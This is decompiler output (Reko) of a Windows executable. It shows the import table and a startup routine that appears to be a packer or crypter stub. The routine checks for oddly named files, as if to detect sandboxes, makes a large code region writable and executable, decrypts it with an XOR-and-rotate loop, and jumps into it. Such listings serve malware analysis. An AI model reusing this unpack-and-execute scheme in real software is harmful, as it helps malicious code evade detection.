// subject_data_0001.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

CHAR g_t4327C8 = 'N'; // 004327C8
CHAR g_t4327D2 = '5'; // 004327D2
CHAR g_t4327EC = 'Q'; // 004327EC
CHAR g_t43280C = 'Z'; // 0043280C
CHAR g_t432818 = 'u'; // 00432818
// subject_rdata.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

<anonymous> * __imp__lstrcmpiW = &g_tF3F6; // 0040F000
<anonymous> * __imp__LoadLibraryExA = &g_tF402; // 0040F004
<anonymous> * __imp__GetTickCount = &g_tF414; // 0040F008
<anonymous> * __imp__GetFileAttributesW = &g_tF424; // 0040F00C
<anonymous> * __imp__HeapReAlloc = &g_tF43A; // 0040F010
<anonymous> * __imp__VirtualAlloc = &g_tF448; // 0040F014
<anonymous> * __imp__SetErrorMode = &g_tF458; // 0040F018
<anonymous> * __imp__DeleteCriticalSection = &g_tF468; // 0040F01C
<anonymous> * __imp__GetFileType = &g_tF480; // 0040F020
<anonymous> * __imp__GetEnvironmentVariableA = &g_tF48E; // 0040F024
<anonymous> * __imp__QueryPerformanceCounter = &g_tF4A8; // 0040F028
<anonymous> * __imp__GetACP = &g_tF4C2; // 0040F02C
<anonymous> * __imp__lstrcmpA = &g_tF4CC; // 0040F030
<anonymous> * __imp__SizeofResource = &g_tF4D8; // 0040F034
<anonymous> * __imp__CreateThread = &g_tF4EA; // 0040F038
<anonymous> * __imp__FlushFileBuffers = &g_tF4FA; // 0040F03C
<anonymous> * __imp__lstrlenW = &g_tF50E; // 0040F040
<anonymous> * __imp__ReadFile = &g_tF51A; // 0040F044
<anonymous> * __imp__LeaveCriticalSection = &g_tF526; // 0040F048
<anonymous> * __imp__SetUnhandledExceptionFilter = &g_tF53E; // 0040F04C
<anonymous> * __imp__RtlUnwind = &g_tF55C; // 0040F050
<anonymous> * __imp__GlobalUnlock = &g_tF568; // 0040F054
<anonymous> * __imp__CloseHandle = &g_tF578; // 0040F058
<anonymous> * __imp__InitializeCriticalSectionAndSpinCount = &g_tF586; // 0040F05C
<anonymous> * __imp__ExitProcess = &g_tF5AE; // 0040F060
<anonymous> * __imp__UnhandledExceptionFilter = &g_tF5BC; // 0040F064
<anonymous> * __imp__GetLocaleInfoW = &g_tF5D8; // 0040F068
<anonymous> * __imp__InterlockedCompareExchange = &g_tF5EA; // 0040F06C
<anonymous> * __imp__LoadLibraryExW = &g_tF608; // 0040F070
<anonymous> * __imp__GetEnvironmentStrings = &g_tF61A; // 0040F074
<anonymous> * __imp__LocalAlloc = &g_tF632; // 0040F078
<anonymous> * __imp__GetDriveTypeW = &g_tF640; // 0040F07C
<anonymous> * __imp__EnterCriticalSection = &g_tF650; // 0040F080
<anonymous> * __imp__SetEvent = &g_tF668; // 0040F084
<anonymous> * __imp__GetCommandLineW = &g_tF674; // 0040F088
<anonymous> * __imp__CompareFileTime = &g_tF686; // 0040F08C
<anonymous> * __imp__VirtualProtect = &g_tF698; // 0040F090
<anonymous> * __imp__HeapAlloc = &g_tF6AA; // 0040F094
<anonymous> * __imp__InterlockedExchange = &g_tF6B6; // 0040F098
<anonymous> * __imp__TerminateProcess = &g_tF6CC; // 0040F09C
<anonymous> * __imp__GetLastError = &g_tF6E0; // 0040F0A0
<anonymous> * __imp__GetVersionExA = &g_tF6F0; // 0040F0A4
<anonymous> * __imp__RemoveDirectoryA = &g_tF700; // 0040F0A8
<anonymous> * __imp__SetEnvironmentVariableA = &g_tF714; // 0040F0AC
<anonymous> * __imp__CreateEventA = &g_tF72E; // 0040F0B0
<anonymous> * __imp__GetProcAddress = &g_tF73E; // 0040F0B4
<anonymous> * __imp__CreateFileA = &g_tF750; // 0040F0B8
<anonymous> * __imp__FindResourceA = &g_tF75E; // 0040F0BC
<anonymous> * __imp__LCMapStringA = &g_tF76E; // 0040F0C0
<anonymous> * __imp__SetHandleCount = &g_tF77E; // 0040F0C4
<anonymous> * __imp__GetSystemTimeAsFileTime = &g_tF790; // 0040F0C8
<anonymous> * __imp__GetCurrentThreadId = &g_tF7AA; // 0040F0CC
<anonymous> * __imp__GetModuleHandleA = &g_tF7C0; // 0040F0D0
<anonymous> * __imp__SetStdHandle = &g_tF7D4; // 0040F0D4
<anonymous> * __imp__IsDebuggerPresent = &g_tF7E4; // 0040F0D8
<anonymous> * __imp__SetFilePointer = &g_tF7F8; // 0040F0DC
<anonymous> * __imp__GetFileSize = &g_tF80A; // 0040F0E0
<anonymous> * __imp__GetCurrentProcessId = &g_tF818; // 0040F0E4
<anonymous> * __imp__lstrlenA = &g_tF82E; // 0040F0E8
<anonymous> * __imp__GetSystemInfo = &g_tF83A; // 0040F0EC
<anonymous> * __imp__OutputDebugStringA = &g_tF84A; // 0040F0F0
<anonymous> * __imp__FreeLibrary = &g_tF860; // 0040F0F4
<anonymous> * __imp__GetVersion = &g_tF86E; // 0040F0F8
<anonymous> * __imp__VirtualFree = &g_tF87C; // 0040F0FC
<anonymous> * __imp__WideCharToMultiByte = &g_tF88A; // 0040F100
<anonymous> * __imp__DisableThreadLibraryCalls = &g_tF8A0; // 0040F104
<anonymous> * __imp___cexit = &g_tF8C8; // 0040F10C
<anonymous> * __imp___vsnwprintf = &g_tF8D2; // 0040F110
<anonymous> * __imp___initterm = &g_tF8E0; // 0040F114
<anonymous> * __imp__atoi = &g_tF8EC; // 0040F118
<anonymous> * __imp___XcptFilter = &g_tF8F4; // 0040F11C
<anonymous> * __imp__??0exception@@QAE@ABQBD@Z = &g_tF902; // 0040F120
<anonymous> * __imp__strncmp = &g_tF91E; // 0040F124
<anonymous> * __imp___purecall = &g_tF928; // 0040F128
<anonymous> * __imp__wcstol = &g_tF934; // 0040F12C
<anonymous> * __imp__memcpy = &g_tF93E; // 0040F130
<anonymous> * __imp___CxxThrowException = &g_tF948; // 0040F134
<anonymous> * __imp__DefWindowProcA = &g_tF96A; // 0040F13C
<anonymous> * __imp__SetWindowTextA = &g_tF97C; // 0040F140
<anonymous> * __imp__MapWindowPoints = &g_tF98E; // 0040F144
<anonymous> * __imp__FillRect = &g_tF9A0; // 0040F148
<anonymous> * __imp__CallNextHookEx = &g_tF9AC; // 0040F14C
<anonymous> * __imp__DrawEdge = &g_tF9BE; // 0040F150
<anonymous> * __imp__CallWindowProcA = &g_tF9CA; // 0040F154
<anonymous> * __imp__SetWindowPlacement = &g_tF9DC; // 0040F158
<anonymous> * __imp__AdjustWindowRectEx = &g_tF9F2; // 0040F15C
<anonymous> * __imp__SetWindowLongW = &g_tFA08; // 0040F160
<anonymous> * __imp__DispatchMessageW = &g_tFA1A; // 0040F164
<anonymous> * __imp__EnableWindow = &g_tFA2E; // 0040F168
<anonymous> * __imp__IsRectEmpty = &g_tFA3E; // 0040F16C
<anonymous> * __imp__UnhookWindowsHookEx = &g_tFA4C; // 0040F170
<anonymous> * __imp__LoadStringW = &g_tFA62; // 0040F174
<anonymous> * __imp__OffsetRect = &g_tFA70; // 0040F178
<anonymous> * __imp__DestroyIcon = &g_tFA7E; // 0040F17C
<anonymous> * __imp__FindWindowW = &g_tFA8C; // 0040F180
<anonymous> * __imp__CoCreateInstance = &g_tFAA4; // 0040F188
<anonymous> * __imp__CoInitialize = &g_tFAB8; // 0040F18C
<anonymous> * __imp__StringFromGUID2 = &g_tFAC8; // 0040F190
<anonymous> * __imp__CreateFontIndirectW = &g_tFAE4; // 0040F198
<anonymous> * __imp__SaveDC = &g_tFAFA; // 0040F19C
<anonymous> * __imp__DeleteObject = &g_tFB04; // 0040F1A0
<anonymous> * __imp__SetTextColor = &g_tFB14; // 0040F1A4
<anonymous> * __imp__GetDIBits = &g_tFB24; // 0040F1A8
<anonymous> * __imp__SelectObject = &g_tFB30; // 0040F1AC
<anonymous> * __imp__CreateCompatibleDC = &g_tFB40; // 0040F1B0
word32 g_dw40F230 = 0xF3F6; // 0040F230
word32 g_dw40F234 = 62466; // 0040F234
word32 g_dw40F238 = 0xF414; // 0040F238
word32 g_dw40F23C = 0xF424; // 0040F23C
word32 g_dw40F240 = 62522; // 0040F240
word32 g_dw40F244 = 0xF448; // 0040F244
word32 g_dw40F248 = 62552; // 0040F248
word32 g_dw40F24C = 62568; // 0040F24C
word32 g_dw40F250 = 0xF480; // 0040F250
word32 g_dw40F254 = 62606; // 0040F254
word32 g_dw40F258 = 62632; // 0040F258
word32 g_dw40F25C = 62658; // 0040F25C
word32 g_dw40F260 = 62668; // 0040F260
word32 g_dw40F264 = 62680; // 0040F264
word32 g_dw40F268 = 62698; // 0040F268
word32 g_dw40F26C = 0xF4FA; // 0040F26C
word32 g_dw40F270 = 0xF50E; // 0040F270
word32 g_dw40F274 = 62746; // 0040F274
word32 g_dw40F278 = 0xF526; // 0040F278
word32 g_dw40F27C = 62782; // 0040F27C
word32 g_dw40F280 = 0xF55C; // 0040F280
word32 g_dw40F284 = 62824; // 0040F284
word32 g_dw40F288 = 0xF578; // 0040F288
word32 g_dw40F28C = 0xF586; // 0040F28C
word32 g_dw40F290 = 0xF5AE; // 0040F290
word32 g_dw40F294 = 0xF5BC; // 0040F294
word32 g_dw40F298 = 62936; // 0040F298
word32 g_dw40F29C = 0xF5EA; // 0040F29C
word32 g_dw40F2A0 = 0xF608; // 0040F2A0
word32 g_dw40F2A4 = 63002; // 0040F2A4
word32 g_dw40F2A8 = 63026; // 0040F2A8
word32 g_dw40F2AC = 0xF640; // 0040F2AC
word32 g_dw40F2B0 = 0xF650; // 0040F2B0
word32 g_dw40F2B4 = 0xF668; // 0040F2B4
word32 g_dw40F2B8 = 0xF674; // 0040F2B8
word32 g_dw40F2BC = 0xF686; // 0040F2BC
word32 g_dw40F2C0 = 0xF698; // 0040F2C0
word32 g_dw40F2C4 = 0xF6AA; // 0040F2C4
word32 g_dw40F2C8 = 0xF6B6; // 0040F2C8
word32 g_dw40F2CC = 0xF6CC; // 0040F2CC
word32 g_dw40F2D0 = 0xF6E0; // 0040F2D0
word32 g_dw40F2D4 = 0xF6F0; // 0040F2D4
word32 g_dw40F2D8 = 0xF700; // 0040F2D8
word32 g_dw40F2DC = 63252; // 0040F2DC
word32 g_dw40F2E0 = 0xF72E; // 0040F2E0
word32 g_dw40F2E4 = 0xF73E; // 0040F2E4
word32 g_dw40F2E8 = 0xF750; // 0040F2E8
word32 g_dw40F2EC = 63326; // 0040F2EC
word32 g_dw40F2F0 = 63342; // 0040F2F0
word32 g_dw40F2F4 = 0xF77E; // 0040F2F4
word32 g_dw40F2F8 = 63376; // 0040F2F8
word32 g_dw40F2FC = 0xF7AA; // 0040F2FC
word32 g_dw40F300 = 0xF7C0; // 0040F300
word32 g_dw40F304 = 63444; // 0040F304
word32 g_dw40F308 = 63460; // 0040F308
word32 g_dw40F30C = 0xF7F8; // 0040F30C
word32 g_dw40F310 = 0xF80A; // 0040F310
word32 g_dw40F314 = 0xF818; // 0040F314
word32 g_dw40F318 = 63534; // 0040F318
word32 g_dw40F31C = 63546; // 0040F31C
word32 g_dw40F320 = 63562; // 0040F320
word32 g_dw40F324 = 0xF860; // 0040F324
word32 g_dw40F328 = 0xF86E; // 0040F328
word32 g_dw40F32C = 63612; // 0040F32C
word32 g_dw40F330 = 63626; // 0040F330
word32 g_dw40F334 = 0xF8A0; // 0040F334
word32 g_dw40F33C = 63688; // 0040F33C
word32 g_dw40F340 = 63698; // 0040F340
word32 g_dw40F344 = 0xF8E0; // 0040F344
word32 g_dw40F348 = 0xF8EC; // 0040F348
word32 g_dw40F34C = 0xF8F4; // 0040F34C
word32 g_dw40F350 = 0xF902; // 0040F350
word32 g_dw40F354 = 63774; // 0040F354
word32 g_dw40F358 = 0xF928; // 0040F358
word32 g_dw40F35C = 63796; // 0040F35C
word32 g_dw40F360 = 63806; // 0040F360
word32 g_dw40F364 = 63816; // 0040F364
word32 g_dw40F36C = 0xF96A; // 0040F36C
word32 g_dw40F370 = 63868; // 0040F370
word32 g_dw40F374 = 63886; // 0040F374
word32 g_dw40F378 = 0xF9A0; // 0040F378
word32 g_dw40F37C = 63916; // 0040F37C
word32 g_dw40F380 = 63934; // 0040F380
word32 g_dw40F384 = 63946; // 0040F384
word32 g_dw40F388 = 63964; // 0040F388
word32 g_dw40F38C = 0xF9F2; // 0040F38C
word32 g_dw40F390 = 0xFA08; // 0040F390
word32 g_dw40F394 = 0xFA1A; // 0040F394
word32 g_dw40F398 = 64046; // 0040F398
word32 g_dw40F39C = 64062; // 0040F39C
word32 g_dw40F3A0 = 64076; // 0040F3A0
word32 g_dw40F3A4 = 0xFA62; // 0040F3A4
word32 g_dw40F3A8 = 0xFA70; // 0040F3A8
word32 g_dw40F3AC = 64126; // 0040F3AC
word32 g_dw40F3B0 = 64140; // 0040F3B0
word32 g_dw40F3B8 = 64164; // 0040F3B8
word32 g_dw40F3BC = 64184; // 0040F3BC
word32 g_dw40F3C0 = 64200; // 0040F3C0
word32 g_dw40F3C8 = 64228; // 0040F3C8
word32 g_dw40F3CC = 0xFAFA; // 0040F3CC
word32 g_dw40F3D0 = 0xFB04; // 0040F3D0
word32 g_dw40F3D4 = 64276; // 0040F3D4
word32 g_dw40F3D8 = 64292; // 0040F3D8
word32 g_dw40F3DC = 0xFB30; // 0040F3DC
word32 g_dw40F3E0 = 0xFB40; // 0040F3E0
// subject_text.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401011: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	Eq_3 ebx;
	word32 dwLoc20;
	Eq_5 dwLoc18;
	Eq_5 dwLoc1C;
	GetCommandLineW();
	Eq_5 eax_26 = CreateFileA(&g_t4327EC, 0x60000000, 0x02, null, 0x03, 0x0121, 0x00);
	if (eax_26 == ~0x00)
	{
		Eq_71 eax_31 = GetModuleHandleA(&g_t4327C8);
		GetTickCount();
		Eq_5 eax_54 = CreateFileA(&g_t432818, 0x60000000, 0x06, null, 0x03, 0x03, 0x00);
		Eq_98 eax_57 = GetProcAddress(eax_31, &g_t43280C);
		Eq_5 eax_76 = CreateFileA(&g_t4327D2, 0x20000000, 0x03, null, 0x03, 0x84, 0x00);
		dwLoc1C = eax_54;
		dwLoc18 = eax_76;
		if (eax_76 == ~0x00)
		{
			GetCurrentProcessId();
			CloseHandle(eax_54);
			int32 eax_201 = eax_57();
			GetCommandLineW();
			GetCurrentProcessId();
			<anonymous> * eax_211 = (eax_201 ^ 0xC0000005) + 0x00401126;
			Eq_2 eax_214;
			word32 ecx_215;
			word32 edx_216;
			eax_211();
			return eax_214;
		}
		CloseHandle(eax_54);
		GetCommandLineW();
		SizeofResource(null, eax_54);
		VirtualProtect(&g_dw40127F, 55664, 0x40, eax_76);
		GetFileType(eax_26);
	}
	GetCurrentProcessId();
	GetCurrentThreadId();
	CloseHandle(eax_26);
	GetFileSize(dwLoc18, null);
	GetFileType(eax_26);
	CloseHandle(dwLoc1C);
	GetFileType(dwLoc18);
	byte cl_161 = fn00401205(&g_dw40127F, 55664, dwLoc20);
	DWORD eax_158 = GetCurrentThreadId();
	*((word32) eax_158 + 988026082) = (Eq_2) __rcr<byte,byte>(*((word32) eax_158 + 988026082), cl_161, SLICE(cond(eax_158 - 3306941242), bool, 1));
	Eq_191 v28_172 = *((word32) eax_158 + 988026150) - ebx;
	*((word32) eax_158 + 988026150) = (Eq_2) v28_172;
	if (OVERFLOW<word32>(v28_172))
		;
}

// 00401205: Register byte fn00401205(Stack (ptr32 word32) dwArg04, Stack uint32 dwArg08, Stack word32 dwArg0C)
// Called from:
//      Win32CrtStartup
byte fn00401205(word32 * dwArg04, uint32 dwArg08, word32 dwArg0C)
{
	word32 * edx_13 = dwArg04;
	uint32 ecx_10 = dwArg08 >> 0x02;
	do
	{
		*edx_13 -= dwArg0C;
		*edx_13 = *edx_13 ^ 1422211808;
		*edx_13 = -*edx_13;
		*edx_13 = __ror<word32,byte>(*edx_13, 0x60);
		*edx_13 -= dwArg0C;
		*edx_13 = *edx_13 ^ dwArg0C;
		++edx_13;
		--ecx_10;
	} while (ecx_10 != 0x00);
	return (byte) ecx_10;
}

word32 g_dw40127F = 2806234085; // 0040127F
